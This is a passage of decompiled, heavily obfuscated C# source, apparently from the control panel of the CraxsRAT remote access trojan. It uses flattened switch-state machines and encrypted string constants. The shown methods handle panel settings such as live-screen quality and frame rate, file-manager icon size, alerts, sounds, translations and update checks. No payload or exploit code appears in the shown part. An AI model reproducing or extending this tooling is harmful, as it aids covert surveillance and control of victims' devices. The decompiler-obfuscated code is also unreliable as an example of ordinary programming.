            num1 = num4 = index < sizearry.Length ? -1898101331 : (num4 = 2039078378);
            continue;
          case 5:
            this.resolutioncombo.Items.Add((object) sizearry[index]);
            ++index;
            num1 = -594955144;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated method
            this.resolutioncombo.Text = MySettings.get_Settings().resolution;
            num1 = (int) num3 * -405417028 ^ -799439489;
            continue;
          case 7:
            this.Translateme();
            sizearry = ((Drooper) this).sizearry;
            index = 0;
            num1 = (int) num3 * -1509237448 ^ -1811397351;
            continue;
          case 8:
            num1 = (int) num3 * 292872838 ^ 593877770;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      this.GetValues();
      try
      {
        string Left = Codes.updateLog();
        if (Operators.CompareString(Left, EXGuarder.\u0035861661E, false) == 0)
          goto label_17;
label_13:
        int num5 = 1167082888;
label_14:
        while (true)
        {
          int num6 = num5;
          uint num7;
          switch ((num7 = (uint) -((~(-860515433 ^ 1444788866) ^ ~-1220334677 + ~-594783240) * -366336537 - num6 * 1233923065 - 933179201)) % 5U)
          {
            case 0:
              goto label_15;
            case 1:
              goto label_17;
            case 2:
              goto label_13;
            case 3:
              this.LogBrowser.DocumentText = Left;
              num5 = (int) num7 * -396543801 ^ 627635676;
              continue;
            case 4:
              num5 = (int) num7 * -1050315700 ^ 524481153;
              continue;
            default:
              goto label_3;
          }
        }
label_15:
        return;
label_3:
        return;
label_17:
        this.LogBrowser.Visible = false;
        num5 = 193111505;
        goto label_14;
      }
      catch (Exception ex)
      {
        this.LogBrowser.Visible = false;
        return;
      }
label_5:
      this.Label17.Text = EXGuarder.\u00352461310.Replace(EXGuarder.\u003101F641F, email);
      num1 = 1962657005;
      goto label_2;
    }

    private void Translateme()
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = -986179637;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 + ~((~~591811716 ^ 674663288) * -1269370495) - (-(-2013373752 * 1717567963) - ~(538154112 - -258595297) - -1061871225) - ~394165874) * 1854442345 + --1292371893)) % 32U)
        {
          case 0:
            goto label_1;
          case 1:
            int num3 = Operators.CompareString(language, EXGuarder.\u00363573021, false) != 0 ? -1518551447 : (num3 = -720584034);
            num1 = num3 ^ (int) num2 * 860102435;
            continue;
          case 2:
            this.Label14.Text = Codes.Translate(this.Label14.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            num1 = (int) num2 * 466124351 ^ 1740172384;
            continue;
          case 3:
            int num4 = Operators.CompareString(language, EXGuarder.\u00326294409, false) == 0 ? 1777671353 : (num4 = 1358763541);
            num1 = num4 ^ (int) num2 * 1198854884;
            continue;
          case 4:
            this.checkupdatbtn.Text = EXGuarder.\u0035B55236E;
            num1 = (int) num2 * 797438800 ^ 1624374666;
            continue;
          case 5:
            this.Label1.Text = Codes.Translate(this.Label1.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            this.recordfps.Text = EXGuarder.\u003313F5E70;
            num1 = (int) num2 * -1592039107 ^ -903145875;
            continue;
          case 6:
            this.Label14.Text = Codes.Translate(this.Label14.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            num1 = (int) num2 * 106680719 ^ -1610375095;
            continue;
          case 7:
            this.Label13.Text = Codes.Translate(this.Label13.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            num1 = (int) num2 * -2055154781 ^ -1685826489;
            continue;
          case 8:
            num1 = (int) num2 * -163222467 ^ 1167144802;
            continue;
          case 9:
            this.Label7.Text = Codes.Translate(this.Label7.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            num1 = (int) num2 * -168272737 ^ -1057547147;
            continue;
          case 10:
            this.exitbtn.Text = EXGuarder.\u0032D11031F;
            this.Generaltext.Text = Codes.Translate(this.Generaltext.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            this.Label3.Text = Codes.Translate(this.Label3.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            num1 = (int) num2 * -1992217316 ^ 1456791840;
            continue;
          case 11:
            this.Label15.Text = Codes.Translate(this.Label15.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            this.Label16.Text = Codes.Translate(this.Label16.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            num1 = (int) num2 * -866541042 ^ -1359687113;
            continue;
          case 12:
            this.resetbtn.Text = EXGuarder.\u0030C0D1E07;
            this.recordfps.Text = EXGuarder.\u00332344F1E;
            num1 = (int) num2 * 949362876 ^ -758988556;
            continue;
          case 13:
            this.Label13.Text = Codes.Translate(this.Label13.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            num1 = (int) num2 * 779900291 ^ -1220819759;
            continue;
          case 14:
            this.Label15.Text = Codes.Translate(this.Label15.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            this.Label16.Text = Codes.Translate(this.Label16.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            num1 = (int) num2 * -533066786 ^ 86495372;
            continue;
          case 15:
            this.Label12.Text = Codes.Translate(this.Label12.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            num1 = (int) num2 * -1045339705 ^ 2006102182;
            continue;
          case 16:
            this.label10.Text = Codes.Translate(this.label10.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            num1 = (int) num2 * -1615552842 ^ 936441503;
            continue;
          case 17:
            this.Generaltext.Text = Codes.Translate(this.Generaltext.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            num1 = (int) num2 * 2119922047 ^ -1617821431;
            continue;
          case 18:
            this.Label8.Text = Codes.Translate(this.Label8.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            this.Label9.Text = Codes.Translate(this.Label9.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            num1 = (int) num2 * 108748915 ^ 838350150;
            continue;
          case 19:
            this.resetbtn.Text = EXGuarder.\u00371736756;
            this.checkupdatbtn.Text = EXGuarder.\u003422E3128;
            num1 = (int) num2 * 685957260 ^ -1382887938;
            continue;
          case 20:
            this.Label5.Text = Codes.Translate(this.Label5.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            num1 = (int) num2 * 1940960860 ^ 875861729;
            continue;
          case 21:
            this.exitbtn.Text = EXGuarder.\u00324042F66;
            num1 = (int) num2 * -709512174 ^ -1833763178;
            continue;
          case 22:
            this.Label3.Text = Codes.Translate(this.Label3.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            this.Label4.Text = Codes.Translate(this.Label4.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            this.Label5.Text = Codes.Translate(this.Label5.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            this.Label6.Text = Codes.Translate(this.Label6.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            num1 = (int) num2 * 1691936523 ^ -78297508;
            continue;
          case 23:
            this.label11.Text = Codes.Translate(this.label11.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            num1 = (int) num2 * 638387700 ^ 1191731931;
            continue;
          case 24:
            this.Label4.Text = Codes.Translate(this.Label4.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            num1 = (int) num2 * -827944050 ^ -2005524284;
            continue;
          case 25:
            this.Label6.Text = Codes.Translate(this.Label6.Text, EXGuarder.\u00305112748, EXGuarder.\u0034365550E);
            num1 = (int) num2 * 982868159 ^ 341024934;
            continue;
          case 26:
            goto label_3;
          case 27:
            this.Label9.Text = Codes.Translate(this.Label9.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            this.label10.Text = Codes.Translate(this.label10.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            this.label11.Text = Codes.Translate(this.label11.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            this.Label12.Text = Codes.Translate(this.Label12.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            num1 = (int) num2 * 292902859 ^ -1028666036;
            continue;
          case 28:
            this.savebtn.Text = EXGuarder.\u00322512F3D;
            num1 = (int) num2 * 4215637 ^ -1411092489;
            continue;
          case 29:
            this.Label1.Text = Codes.Translate(this.Label1.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            num1 = -702192663;
            continue;
          case 30:
            this.Label7.Text = Codes.Translate(this.Label7.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            num1 = (int) num2 * 210648119 ^ 677461525;
            continue;
          case 31:
            this.Label8.Text = Codes.Translate(this.Label8.Text, EXGuarder.\u00305112748, EXGuarder.\u0032E495107);
            num1 = (int) num2 * 2069272227 ^ 993710494;
            continue;
          default:
            goto label_34;
        }
      }
label_3:
      return;
label_34:;
    }

    public void GetValues()
    {
      try
      {
        // ISSUE: reference to a compiler-generated method
        if (Operators.CompareString(MySettings.get_Settings().hidecoonstart, EXGuarder.\u0034678316B, false) != 0)
          goto label_8;
label_1:
        int num1 = 964239981;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          string[] files;
          int index;
          switch ((num3 = (uint) (~(1791645259 ^ 1697823513) - (~(-29574822 ^ 1634140728 - -13258937) - ~(num2 * -2070185253)) ^ ~-1568069982 ^ -328533754)) % 26U)
          {
            case 0:
              this.Checklogit.Active = false;
              num1 = -1503829659;
              continue;
            case 1:
              num1 = (int) num3 * -600127932 ^ -694556050;
              continue;
            case 2:
              files = Directory.GetFiles(Settings.res_Path + EXGuarder.\u003740D3F46);
              index = 0;
              num1 = (int) num3 * -1560290073 ^ -138653022;
              continue;
            case 3:
              // ISSUE: reference to a compiler-generated method
              this.FMQ.Text = Conversions.ToString(MySettings.get_Settings().ImageQualty);
              // ISSUE: reference to a compiler-generated method
              this.LiveSQ.Text = Conversions.ToString(this.LiveSQ.Items[this.LiveSQ.Items.IndexOf((object) MySettings.get_Settings().live_sc_qulty)]);
              // ISSUE: reference to a compiler-generated method
              this.LSFPS.Text = Conversions.ToString(this.LSFPS.Items[this.LSFPS.Items.IndexOf((object) MySettings.get_Settings().live_fps_rec)]);
              // ISSUE: reference to a compiler-generated method
              this.Checkplysound.Active = MySettings.get_Settings().NOTI_SOUND;
              num1 = 440528231;
              continue;
            case 4:
              this.CheckHidecoonstart.Active = true;
              num1 = (int) num3 * 1160932861 ^ -1290075051;
              continue;
            case 5:
              this.Checklogit.Active = true;
              num1 = (int) num3 * 749956640 ^ 1194694853;
              continue;
            case 6:
              num1 = (int) num3 * -761279479 ^ 9087247;
              continue;
            case 7:
              int num4;
              // ISSUE: reference to a compiler-generated method
              num1 = num4 = Operators.CompareString(MySettings.get_Settings().LOG, EXGuarder.\u0034678316B, false) != 0 ? 1284317965 : (num4 = -406344234);
              continue;
            case 8:
              int num5;
              // ISSUE: reference to a compiler-generated method
              num1 = num5 = Operators.CompareString(MySettings.get_Settings().ShowAlertDis, EXGuarder.\u0034678316B, false) != 0 ? 1525657512 : (num5 = -1502097564);
              continue;
            case 9:
              goto label_8;
            case 10:
              this.Checksaveit.Active = false;
              num1 = 1365073180;
              continue;
            case 11:
              goto label_1;
            case 12:
              this.CheckFMI.Active = false;
              num1 = -1402163486;
              continue;
            case 13:
              this.CheckNotifiDis.Active = false;
              num1 = -1306426118;
              continue;
            case 14:
              num1 = (int) num3 * 871191465 ^ 718724342;
              continue;
            case 15:
              this.CheckNotifiDis.Active = true;
              num1 = (int) num3 * 2124163105 ^ 1987306884;
              continue;
            case 16:
              num1 = (int) num3 * 1189557453 ^ 669597149;
              continue;
            case 17:
              int num6;
              // ISSUE: reference to a compiler-generated method
              num1 = num6 = Operators.CompareString(MySettings.get_Settings().FM_IC_Size, EXGuarder.\u0032D61355A, false) != 0 ? 380927127 : (num6 = 1483271315);
              continue;
            case 18:
              this.CheckFMI.Active = true;
              num1 = (int) num3 * -2136325601 ^ 469102628;
              continue;
            case 19:
label_14:
              if (index < files.Length)
              {
                num1 = -258565675;
                continue;
              }
              goto label_48;
            case 20:
              int num7;
              // ISSUE: reference to a compiler-generated method
              num1 = num7 = Operators.CompareString(MySettings.get_Settings().Saving_data, EXGuarder.\u0034678316B, false) != 0 ? 805525367 : (num7 = -309515018);
              continue;
            case 21:
              this.CheckNotifi.Active = false;
              num1 = 888991411;
              continue;
            case 22:
              int num8;
              // ISSUE: reference to a compiler-generated method
              num1 = num8 = Operators.CompareString(MySettings.get_Settings().show_alert, EXGuarder.\u0034678316B, false) != 0 ? -1797723340 : (num8 = 800255192);
              continue;
            case 23:
              this.Checksaveit.Active = true;
              num1 = (int) num3 * 1185951123 ^ 100617115;
              continue;
            case 25:
              this.CheckNotifi.Active = true;
              num1 = (int) num3 * -1380580708 ^ 146660277;
              continue;
            default:
              string path = files[index];
              try
              {
                this.selectedsoundcombo.Items.Add((object) Path.GetFileName(path).Split('.')[0]);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              checked { ++index; }
              break;
          }
label_32:
          int num9 = -1645900575;
label_33:
          while (true)
          {
            int num10 = num9;
            uint num11;
            string language;
            switch ((num11 = (uint) (~(1791645259 ^ 1697823513) - (~(-29574822 ^ 1634140728 - -13258937) - ~(num10 * -2070185253)) ^ ~-1568069982 ^ -328533754)) % 18U)
            {
              case 0:
                this.lngtext.Text = EXGuarder.\u0034E62504A;
                num9 = -759979551;
                continue;
              case 1:
                this.Checkupdate.Active = false;
                num9 = 614300816;
                continue;
              case 2:
                num9 = (int) num11 * -1975922230 ^ -144271360;
                continue;
              case 3:
                int num12 = Operators.CompareString(language, EXGuarder.\u00376795F23, false) != 0 ? 1336158040 : (num12 = 1853221692);
                num9 = num12 ^ (int) num11 * -1346383971;
                continue;
              case 4:
                goto label_56;
              case 5:
                goto label_32;
              case 6:
                goto label_14;
              case 7:
                language = RegistryHandler.Get_Language();
                num9 = -905146023;
                continue;
              case 8:
                int num13 = Operators.CompareString(language, EXGuarder.\u003674B7177, false) == 0 ? -420323899 : (num13 = 988060697);
                num9 = num13 ^ (int) num11 * 1006648640;
                continue;
              case 9:
                RegistryHandler.SET_SoundID(EXGuarder.\u00349125111);
                num9 = (int) num11 * -470579126 ^ 17803224;
                continue;
              case 10:
                this.lngtext.Text = EXGuarder.\u003420D4375;
                num9 = -759979551;
                continue;
              case 11:
                num9 = (int) num11 * -761261756 ^ 1507632565;
                continue;
              case 12:
                goto label_48;
              case 13:
                // ISSUE: reference to a compiler-generated method
                int num14 = Operators.CompareString(MySettings.get_Settings().checkupdatestart, EXGuarder.\u0034678316B, false) != 0 ? -544903018 : (num14 = -31957854);
                num9 = num14 ^ (int) num11 * -2100108994;
                continue;
              case 14:
                this.lngtext.Text = EXGuarder.\u003676D010D;
                num9 = (int) num11 * 1608830465 ^ -1829197756;
                continue;
              case 15:
                this.Checkupdate.Active = true;
                num9 = (int) num11 * 1924109133 ^ -805833972;
                continue;
              case 16:
                int num15 = Operators.CompareString(language, EXGuarder.\u003770D7546, false) == 0 ? -1631900935 : (num15 = -1567629434);
                num9 = num15 ^ (int) num11 * 916409936;
                continue;
              case 17:
                ((Drooper) this).progma = true;
                this.selectedsoundcombo.Text = RegistryHandler.GET_SoundID();
                num9 = -1877610118;
                continue;
              default:
                goto label_54;
            }
          }
label_48:
          num9 = RegistryHandler.GET_SoundID() != null ? 1241597810 : (num9 = 494359274);
          goto label_33;
        }
label_56:
        return;
label_54:
        return;
label_8:
        this.CheckHidecoonstart.Active = false;
        num1 = 1316425719;
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_52:
        int num16 = 491440663;
        while (true)
        {
          int num17 = num16;
          uint num18;
          switch ((num18 = (uint) (~(1791645259 ^ 1697823513) - (~(-29574822 ^ 1634140728 - -13258937) - ~(num17 * -2070185253)) ^ ~-1568069982 ^ -328533754)) % 3U)
          {
            case 0:
              goto label_50;
            case 1:
              ProjectData.ClearProjectError();
              num16 = (int) num18 * 1841447445 ^ -1562681487;
              continue;
            case 2:
              goto label_52;
            default:
              goto label_39;
          }
        }
label_50:
        return;
label_39:;
      }
    }

    private void Button2_Click(object sender, EventArgs e)
    {
    }

    private void Button1_Click(object sender, EventArgs e)
    {
    }

    private void DrakeUIAvatar2_Click(object sender, EventArgs e)
    {
      // ISSUE: reference to a compiler-generated method
      MySettings.get_Settings().performance = EXGuarder.\u0036B30583E;
      // ISSUE: reference to a compiler-generated method
      MySettings.get_Settings().show_alert = EXGuarder.\u003126F2A16;
      // ISSUE: reference to a compiler-generated method
      MySettings.get_Settings().ShowAlertDis = EXGuarder.\u003126F2A16;
label_1:
      int num1 = -953237810;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-(num1 - (1613020138 - 511117346 + (-1768883017 - 508672091) + ~--792921623) * 1054562323 * 861012863 ^ -1047010853 * ~(-1013499263 ^ 1202109246 ^ -1458627885 ^ 1052846588)) + (1331081927 - 42551802 ^ 986383985 * 1716768342) + (1046050042 - 1881643069)) * -1331462759)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().Saving_data = EXGuarder.\u003126F2A16;
            num1 = (int) num2 * -539786994 ^ -678549019;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().ImageQualty = Conversions.ToInteger(EXGuarder.\u0030D773301);
            this.GetValues();
            num1 = (int) num2 * -110405053 ^ -790008094;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().hidecoonstart = EXGuarder.\u003126F2A16;
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().LOG = EXGuarder.\u003126F2A16;
            num1 = (int) num2 * -1380764389 ^ 1672494175;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().FM_IC_Size = EXGuarder.\u0030C611309;
            num1 = (int) num2 * -954378095 ^ -1305799195;
            continue;
          case 5:
            goto label_3;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    private void DrakeUIAvatar1_Click(object sender, EventArgs e)
    {
      if (!this.CheckNotifi.Active)
        goto label_32;
label_1:
      int num1 = -2074089857;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-(368497274 - ~(num2 ^ 1202089395 - ~~~-915792029 ^ 1539653579 ^ -293135053 * (-1865005485 * -1062682676) ^ --1645346820) - (--1793591325 - ~311645514)) - 1049209422)) % 32U)
        {
          case 0:
            int num4;
            num1 = num4 = !this.CheckNotifiDis.Active ? -1706800412 : (num4 = -1775448621);
            continue;
          case 1:
            num1 = (int) num3 * 1676362532 ^ -1678529870;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().checkupdatestart = EXGuarder.\u003500C4554;
            num1 = -2021256747;
            continue;
          case 4:
            num1 = (int) num3 * -1306421377 ^ -865215061;
            continue;
          case 5:
            int num5;
            num1 = num5 = !this.CheckFMI.Active ? 1011175516 : (num5 = 1746586208);
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().Save();
            RegistryHandler.SET_SoundID(this.selectedsoundcombo.Text);
            num1 = (int) num3 * 75848633 ^ -322490964;
            continue;
          case 7:
            goto label_32;
          case 8:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().Saving_data = EXGuarder.\u00325330114;
            num1 = (int) num3 * 1557090058 ^ 1688421374;
            continue;
          case 9:
            int num6;
            num1 = num6 = !this.Checklogit.Active ? 1539295463 : (num6 = 2098681189);
            continue;
          case 10:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().hidecoonstart = EXGuarder.\u00325330114;
            num1 = (int) num3 * -2142753425 ^ 17297756;
            continue;
          case 11:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().FM_IC_Size = EXGuarder.\u0035B42336F;
            num1 = (int) num3 * 1114721171 ^ -808662744;
            continue;
          case 12:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().LOG = EXGuarder.\u003500C4554;
            num1 = 1687545687;
            continue;
          case 13:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().live_fps_rec = this.LSFPS.Text;
            num1 = (int) num3 * 1809746801 ^ -932363584;
            continue;
          case 14:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().LOG = EXGuarder.\u00325330114;
            num1 = (int) num3 * -2081962488 ^ -128662753;
            continue;
          case 15:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().ShowAlertDis = EXGuarder.\u003500C4554;
            num1 = 1185214210;
            continue;
          case 16:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().checkupdatestart = EXGuarder.\u00325330114;
            num1 = (int) num3 * -1543351722 ^ 157555509;
            continue;
          case 17:
            // ISSUE: reference to a compiler-generated method
            AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u0033D6C6201);
            num1 = (int) num3 * -249992164 ^ 706966964;
            continue;
          case 18:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().ImageQualty = Conversions.ToInteger(this.FMQ.Text);
            num1 = 1474774744;
            continue;
          case 19:
            int num7 = !this.CheckHidecoonstart.Active ? -1000279347 : (num7 = -231916558);
            num1 = num7 ^ (int) num3 * 947936289;
            continue;
          case 20:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().show_alert = EXGuarder.\u00325330114;
            num1 = (int) num3 * 1002994148 ^ 1612101316;
            continue;
          case 21:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().hidecoonstart = EXGuarder.\u003500C4554;
            num1 = 583647766;
            continue;
          case 22:
            int num8 = !this.Checkupdate.Active ? -1438299979 : (num8 = -1409712345);
            num1 = num8 ^ (int) num3 * -1837524790;
            continue;
          case 23:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().FM_IC_Size = EXGuarder.\u003275E1A2F;
            num1 = -1748160903;
            continue;
          case 24:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().ShowAlertDis = EXGuarder.\u00325330114;
            num1 = (int) num3 * -167309942 ^ 272510386;
            continue;
          case 25:
            RegistryHandler.Set_Language(this.lngtext.Text.Split('-')[0]);
            num1 = (int) num3 * 1320550841 ^ -2139768836;
            continue;
          case 26:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().Saving_data = EXGuarder.\u003500C4554;
            num1 = 1330640814;
            continue;
          case 27:
            goto label_1;
          case 28:
            int num9;
            num1 = num9 = !this.Checksaveit.Active ? 1160770385 : (num9 = 1213216867);
            continue;
          case 29:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().live_sc_qulty = this.LiveSQ.Text;
            num1 = 952447110;
            continue;
          case 30:
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().NOTI_SOUND = this.Checkplysound.Active;
            // ISSUE: reference to a compiler-generated method
            MySettings.get_Settings().resolution = this.resolutioncombo.Text;
            num1 = 1864424562;
            continue;
          case 31:
            num1 = (int) num3 * -1879729394 ^ -741712967;
            continue;
          default:
            goto label_33;
        }
      }
label_33:
      this.Close();
      return;
label_32:
      // ISSUE: reference to a compiler-generated method
      MySettings.get_Settings().show_alert = EXGuarder.\u003500C4554;
      num1 = 2127775947;
      goto label_2;
    }

    private void DrakeUIButton1_Click(object sender, EventArgs e)
    {
    }

    private void Copydev_Click(object sender, EventArgs e)
    {
      RegistryHandler.Set_Language(EXGuarder.\u003672C3069);
    }

    private void DrakeUIButton2_Click(object sender, EventArgs e)
    {
      RegistryHandler.Set_Language(EXGuarder.\u0031E605154);
    }

    private void Selectedsoundcombo_SelectedIndexChanged(object sender, EventArgs e)
    {
      try
      {
        if (!((Drooper) this).progma)
          goto label_8;
label_1:
        int num1 = 1371059198;
label_2:
        string str;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~(~~-num1 - (~-1162416431 ^ 1207257313 * 437115999))) % 11U)
          {
            case 0:
              goto label_1;
            case 1:
              Settings.aMedia = new SoundPlayer();
              num1 = (int) num2 * 1523945812 ^ 827543329;
              continue;
            case 3:
              ((Drooper) this).progma = false;
              num1 = (int) num2 * 256348683 ^ 306786411;
              continue;
            case 4:
              if (File.Exists(str.Replace(EXGuarder.\u0031C212755, this.selectedsoundcombo.Text)))
              {
                num1 = (int) num2 * 850861800 ^ -244899381;
                continue;
              }
              goto label_3;
            case 5:
              goto label_8;
            case 6:
              num1 = (int) num2 * -1595959780 ^ 262734249;
              continue;
            case 7:
              Settings.aMedia.SoundLocation = clrSAVE.getsoundpath();
              Settings.aMedia.Load();
              num1 = (int) num2 * -1257495249 ^ 505450241;
              continue;
            case 8:
              goto label_11;
            case 9:
              Thread.Sleep(100);
              num1 = 1260470721;
              continue;
            case 10:
              RegistryHandler.SET_SoundID(this.selectedsoundcombo.Text);
              num1 = (int) num2 * -1076007567 ^ -1254327563;
              continue;
            default:
              if (!Settings.aMedia.IsLoadCompleted)
                goto case 9;
              else
                goto label_15;
          }
        }
label_11:
        return;
label_3:
        return;
label_15:
        try
        {
          Settings.aMedia.Play();
          return;
        }
        catch (InvalidOperationException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          ProjectData.ClearProjectError();
          return;
        }
label_8:
        str = Settings.res_Path + EXGuarder.\u00361367917;
        num1 = 923524208;
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Resolutioncombo_MouseClick(object sender, MouseEventArgs e)
    {
      if (!((Drooper) this).first)
        return;
label_1:
      int num1 = -184618670;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(((num1 + (~-2121970384 - ~(1322921914 * -1918691913 + -1638680657 * 1098872179 - (-763505213 - 616850675) * 1129837815))) * -1461606361 - (--631980112 - 87160338)) * 1860811113 ^ -880840725)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            ((Drooper) this).first = false;
            Codes.MyMsgBox(EXGuarder.\u003062D7422, EXGuarder.\u00344101326, false, Craxs_Rat.My.Resources.Resources.information48px);
            num1 = (int) num2 * 112882834 ^ -2016919113;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void Checkupdatbtn_Click(object sender, EventArgs e)
    {
      try
      {
        string Left1 = Codes.CheckForUpdates2();
label_1:
        int num1 = -321180933;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 - (~(-1642338819 ^ 115498761) + 1282443216 - ((2146212229 ^ 1335090251 ^ -512467009 ^ ~(1760872589 * -941663097)) + --~-1830428178)) ^ 127374163 + ~(962206396 - -804144127 - -1486609817) ^ ~-1076824539 - -2115557251 ^ -(1546443095 * -500847490) ^ -493894616)) % 3U)
          {
            case 1:
              if (Left1 != null)
              {
                num1 = (int) num2 * -1876315088 ^ 1457952271;
                continue;
              }
              goto label_33;
            case 2:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_6:
        if (Operators.CompareString(Left1, EXGuarder.\u003051A4E43, false) != 0)
        {
          try
          {
            if (Left1.StartsWith(EXGuarder.\u00308116D3B))
              goto label_17;
label_8:
            int num3 = -7144148;
label_9:
            string Left2;
            string language;
            UpdatesScreen updatesScreen;
            string Left3;
            string Right;
            while (true)
            {
              uint num4;
              switch ((num4 = (uint) (num3 - (~(-1642338819 ^ 115498761) + 1282443216 - ((2146212229 ^ 1335090251 ^ -512467009 ^ ~(1760872589 * -941663097)) + --~-1830428178)) ^ 127374163 + ~(962206396 - -804144127 - -1486609817) ^ ~-1076824539 - -2115557251 ^ -(1546443095 * -500847490) ^ -493894616)) % 21U)
              {
                case 0:
                  goto label_8;
                case 1:
                  goto label_17;
                case 2:
                  updatesScreen.logupdate.AppendText(EXGuarder.\u00322751534 + Left2);
                  num3 = -209891797;
                  continue;
                case 3:
                  updatesScreen.logupdate.AppendText(EXGuarder.\u0036E40110B + Left2);
                  num3 = -209891797;
                  continue;
                case 4:
                  updatesScreen.logupdate.AppendText(EXGuarder.\u00376281D2A + Left2);
                  num3 = -209891797;
                  continue;
                case 5:
                  Left2 = Codes.WhatNewupdate2();
                  num3 = -1405250981;
                  continue;
                case 6:
                  updatesScreen.logupdate.AppendText(EXGuarder.\u00322751534 + Left2);
                  num3 = (int) num4 * -1604507741 ^ 1713046499;
                  continue;
                case 7:
                  int num5 = Operators.CompareString(Left2, EXGuarder.\u00325362552, false) != 0 ? -1457896216 : (num5 = -1548484727);
                  num3 = num5 ^ (int) num4 * -1316856325;
                  continue;
                case 8:
                  goto label_10;
                case 9:
                  Right = Left1.Replace(EXGuarder.\u00308116D3B, EXGuarder.\u0035420484E).Split(':')[0];
                  num3 = (int) num4 * 1600834908 ^ -668853375;
                  continue;
                case 10:
                  int num6 = Operators.CompareString(Left3, Right, false) != 0 ? -316053316 : (num6 = -1655324352);
                  num3 = num6 ^ (int) num4 * -1592905033;
                  continue;
                case 11:
                  int num7 = (int) updatesScreen.ShowDialog();
                  num3 = -241421525;
                  continue;
                case 12:
                  Left2 = EXGuarder.\u0032531290C;
                  num3 = (int) num4 * -1710181708 ^ -997971871;
                  continue;
                case 13:
                  int num8 = Operators.CompareString(language, EXGuarder.\u0033A06414A, false) == 0 ? -682130627 : (num8 = 1958745615);
                  num3 = num8 ^ (int) num4 * 573029269;
                  continue;
                case 14:
                  goto label_3;
                case 15:
                  Codes.MyMsgBox(EXGuarder.\u0035D290F5C, EXGuarder.\u0036C0D1821, false, Craxs_Rat.My.Resources.Resources.error48px);
                  num3 = (int) num4 * -772504985 ^ -381195949;
                  continue;
                case 16:
                  goto label_21;
                case 17:
